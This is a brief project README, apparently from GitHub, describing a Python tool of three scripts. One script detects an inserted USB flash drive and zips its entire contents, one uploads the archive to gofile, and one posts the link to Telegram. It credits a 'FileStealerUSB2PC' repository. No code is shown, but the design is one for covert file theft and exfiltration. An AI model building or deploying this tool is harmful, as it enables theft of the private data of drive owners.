> ## Information🔍 ##
I've created a python program consisting of three scripts to send all the data on a USB flash drive in a zip file to telegram. 

>The first script is usb.py, which will detect the insertion of a USB flash drive and send it to Windows as a zip file. Thanks to : @bestmahdi2 https://github.com/bestmahdi2/FileStealerUSB2PC/blob/master/FileStealerUSB2PC.py 


>The second script will upload the zip file to gofile thanks to : @khodekhadem https://github.com/j0rd1s3rr4n0/FileUploader/tree/main/GoFIle

>And the third script will send the file link to telegram.
